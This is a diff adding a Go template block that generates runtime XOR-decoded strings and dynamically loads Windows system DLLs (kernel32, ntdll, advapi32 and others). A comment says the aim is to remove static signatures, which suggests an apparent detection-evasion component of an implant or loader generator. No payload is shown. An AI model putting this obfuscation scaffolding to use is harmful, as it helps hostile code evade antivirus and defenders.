@@ -1,0 +1,100 @@
+{{define "_infra"}}
+// ============================================================
+// 运行时字符串解码 — 消除静态特征
+// ============================================================
+
+const strKey = {{printf "0x%02X" .StringKey}}
+
+func ds(encoded string) string {
+	b, _ := base64.StdEncoding.DecodeString(encoded)
+	for i := range b {
+		b[i] ^= strKey
+	}
+	return string(b)
+}
+
+// ============================================================
+// DLL 句柄缓存 — 每个 DLL 只加载一次
+// ============================================================
+
+var (
+	hKernel32 uintptr
+	hNtdll    uintptr
+	hUser32   uintptr
+	hAdvapi32 uintptr
+	hShell32  uintptr
+)
+
+func kernel32() uintptr {
+	if hKernel32 == 0 {
+		h, _ := syscall.LoadLibrary(ds("{{index .EncodedStrings "kernel32.dll"}}"))
+		hKernel32 = uintptr(h)
+	}
+	return hKernel32
+}
+
+func ntdll() uintptr {
+	if hNtdll == 0 {
+		h, _ := syscall.LoadLibrary(ds("{{index .EncodedStrings "ntdll.dll"}}"))
+		hNtdll = uintptr(h)
+	}
+	return hNtdll
+}
+
+func user32() uintptr {
+	if hUser32 == 0 {
+		h, _ := syscall.LoadLibrary(ds("{{index .EncodedStrings "user32.dll"}}"))
+		hUser32 = uintptr(h)
+	}
+	return hUser32
+}
+
+func advapi32() uintptr {
+	if hAdvapi32 == 0 {
+		h, _ := syscall.LoadLibrary(ds("{{index .EncodedStrings "advapi32.dll"}}"))
+		hAdvapi32 = uintptr(h)
+	}
+	return hAdvapi32
+}
+
+func shell32() uintptr {
+	if hShell32 == 0 {
+		h, _ := syscall.LoadLibrary(ds("{{index .EncodedStrings "shell32.dll"}}"))
+		hShell32 = uintptr(h)
+	}
+	return hShell32
+}
+
+// ============================================================
+// 工具函数
+// ============================================================
+
+func getProcAddr(module uintptr, name string) uintptr {
+	addr, _ := syscall.GetProcAddress(syscall.Handle(module), name)
+	return uintptr(addr)
+}
+
+func toLowerASCII(s string) string {
+	b := make([]byte, len(s))
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if c >= 'A' && c <= 'Z' {
+			c += 32
+		}
+		b[i] = c
+	}
+	return string(b)
+}
+
+func containsSubstr(s, sub string) bool {
+	if len(sub) > len(s) {
+		return false
+	}
+	for i := 0; i <= len(s)-len(sub); i++ {
+		if s[i:i+len(sub)] == sub {
+			return true
+		}
+	}
+	return false
+}
+{{end}}
